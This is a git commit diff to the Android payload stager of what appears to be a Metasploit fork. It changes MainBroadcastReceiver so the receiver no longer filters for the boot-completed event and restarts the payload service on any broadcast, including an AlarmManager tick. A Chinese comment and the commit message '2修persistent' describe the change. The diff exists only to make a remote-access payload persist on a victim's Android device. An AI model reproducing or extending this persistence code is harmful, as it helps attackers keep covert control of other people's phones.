43edf500133918c70dae71d2d1961c83466ed885
fahawifi <45747633+fahawifi@users.noreply.github.com>
2019-12-10 11:14:33 +0800

    2修persistent

--- java/androidpayload/app/src/com/metasploit/stage/MainBroadcastReceiver.java
+++ java/androidpayload/app/src/com/metasploit/stage/MainBroadcastReceiver.java
@@ -8,8 +8,9 @@ public class MainBroadcastReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+       //MainService.java中增加的代码AlarmManager需要一个Receiver。将判断代码——只接收ACTION_BOOT_COMPLETED整行删除
+        // if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
             MainService.startService(context);
         }
     }
-}
+//}
